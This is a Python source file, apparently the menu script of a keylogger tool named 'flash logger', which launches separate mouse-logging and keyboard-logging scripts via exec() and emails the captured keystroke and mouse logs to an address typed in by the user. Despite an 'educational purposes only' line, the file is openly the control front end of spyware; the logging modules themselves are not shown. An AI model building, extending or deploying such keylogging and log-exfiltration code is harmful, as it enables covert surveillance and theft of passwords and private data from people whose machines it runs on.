import send_logs as sl
import os
from termcolor import colored

# Opens ASCII Art where it says: 'Welcome to flash logger'
ori_logo = open("ori-logo.txt", "r")
ori_logo = ori_logo.read()

# Prints logo
print(ori_logo)

# General Information about Product Use and licensing
print("© Copyright Sami Hindi 2022")
print("This product is licensed under the GNU General Public License")
print("For any questions or inquiries, please send me an E-Mail at 'fujiwarachoki@zohomail.eu'")
print("For Educational Purposes only")
print("\n\n")
print("------------------------------------------------------------------------------------------------------")
print("\n\n")

# Asks User which option they want to perform
print("PRESS 'm' FOR MOUSE LOGGER")
print("PRESS 'k' FOR KEYBOARD LOGGER")
print("PRESS 's' TO SEND LOGS TO EMAIL")
print("PRESS ANY OTHER KEY TO EXIT PROGRAM")
choice = input()
print("\n\n")
print("------------------------------------------------------------------------------------------------------")

# Reads file based on user's choice, then takes python script inside it, and runs it
if choice == 'm':
    mouse_logger = open("mouse_logging.py")
    # Reads
    exec(mouse_logger.read())
elif choice == 'k':
    keyboard_logger = open("key_logging.py")
    exec(keyboard_logger.read())
# Will ask for User's Email to send them the logs
elif choice == 's':
    if os.stat("Key_logs/keyboard_logs.txt").st_size == 0 or os.stat("Key_logs/mouse_logs.txt").st_size == 0:
        print(colored("WARNING: ", 'red') + "Please use one of the Loggers first, since both Log-Files are empty!")
    print("\n\n")
    print("------------------------------------------------------------------------------------------------------")
    print("ENTER YOUR EMAIL")
    email = input()
    sl.send_email("Keyboard Logs", sl.logs1, email)
    sl.send_email("Mouse Logs", sl.logs2, email)
    print("Sent Logs to " + email)
else:
    print("\n\n")
    print("------------------------------------------------------------------------------------------------------")
    print("EXITED PROGRAM")
    exit()
